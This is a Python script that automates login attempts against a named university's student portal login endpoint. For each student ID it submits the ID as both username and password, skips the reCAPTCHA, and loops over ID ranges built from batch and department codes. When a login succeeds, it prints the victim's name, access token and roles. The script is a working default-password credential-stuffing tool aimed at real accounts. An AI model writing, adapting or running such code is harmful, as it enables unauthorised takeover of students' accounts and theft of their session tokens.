import requests

def check(payload):
    headers = {
    "Content-Type": "application/json",
    "Origin": "http://studentportal.diu.edu.bd",
    "Referer": "http://studentportal.diu.edu.bd/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }
    try:
        # Send the POST request
        response = requests.post(url, json=payload, headers=headers)
        #print(response)
        # Check the response status code
        data = response.json()
        if data["message"] == "success":
            # Parse the response JSON
    
            data = response.json()
            # Print the response data
            print("Response:")
            print("Name:", data["name"])
            print("Message:", data["message"])
            print("Access Token:", data["accessToken"])
            print("User Name:", data["userName"])
            print("Roles:", data["commaSeparatedRoles"])
            print("Device Name:", data["deviceName"])
        else:
            print(f"Request failed with status code: {response.status_code}")

    except:
        pass
    

# Define the URL
url = "http://software.diu.edu.bd:8006/login"

choice=int(input("If Want to do single Search then Enter 1\nif you want range based search For a Single Batch And Department than Enter 2"))

if choice==1:
    Id = input("Enter Id :")
    payload = {
    "username": f"{Id}",
    "password": f"{Id}",
    "grecaptcha": ""
    }
    check(payload)
elif choice == 2:
    Batch_code=input("Enter Batch Code :")
    Dept_code=input("Enter Department Code :")
    id_range_lower_bound=input("Enter Lower Bound Id :")
    id_range_upper_bound=input("Enter Upper Bound Id :")
    for id in range(int(id_range_lower_bound),int(id_range_upper_bound)+1):
        payload = {
        "username": f"{Batch_code}-{Dept_code}-{str(id)}",
        "password": f"{Batch_code}-{Dept_code}-{str(id)}",
        "grecaptcha": ""
        }
        check(payload)


# Define the headers


# Define the payload

